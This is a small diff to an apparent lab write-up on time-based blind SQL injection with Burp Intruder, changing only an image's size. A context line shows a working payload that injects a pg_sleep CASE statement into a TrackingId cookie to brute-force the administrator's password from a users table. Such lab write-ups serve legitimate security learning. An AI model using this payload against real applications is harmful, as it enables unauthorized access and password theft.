@@ -62,4 +62,4 @@ Burp Intruder monitors the time taken for the application's response to be recei
 4. Brute forcing password with `TrackingId=LsT' SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,$payload01$,1)='$payload02$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`.
 
 
-<img src="../images/poc_final.png"  alt="poc_final.png"  width="250"  height="250">
+<img src="../images/poc_final.png"  alt="poc_final.png"  width="500"  height="600">
